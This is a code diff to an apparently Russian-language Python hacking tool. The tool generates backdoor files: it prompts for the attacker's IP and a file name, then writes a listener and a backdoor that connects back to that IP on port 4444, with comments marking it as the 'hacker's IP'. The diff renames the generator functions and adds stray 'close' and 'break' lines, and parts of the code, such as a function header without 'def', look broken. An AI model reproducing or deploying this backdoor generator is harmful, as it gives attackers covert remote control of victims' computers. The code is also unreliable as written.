@@ -187,7 +187,7 @@ def DefSec4():
 			raise SystemExit
 		def Backdoor99():
 			DefSec4()
-		def Backdoor1():
+		def BackdoorS():
 			os.chdir('USER-BD')
 			ip = input('Введите свой IP')
 			f = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
@@ -234,7 +234,10 @@ class Listener:
 			print(result)
 my_listener = Listener('"""+str(ip)+""", 4444')  #ip  хакера и лбой порт 4444 8080 и т.д Обезательно!
 my_listener.go() """
-		Backdoor2():
+		n.close()
+		break
+				
+		BackdoorC():
 			os.chdir('USER-BD')
 			ip = input('Введите свой IP')
 			f = str(input('Имя файла вашего бэкдора(File name of your backdoor) (file.py):'))
@@ -272,10 +275,13 @@ class Backdoor:
 	
 my_backdoor = Backdoor("ВВедите IP", 4444) #ip хакера обезательно!
 my_backdoor.run() """
+		n.close()
+		break
+				
 		if bdv1 ==1:
-			Backdoor1()
+			BackdoorS()
 		elif bdv1 ==2:
-			Backdoor2()
+			BackdoorC()
 		elif bdv1 ==99:
 			Backdoor99()
 		elif bdv1 ==0:
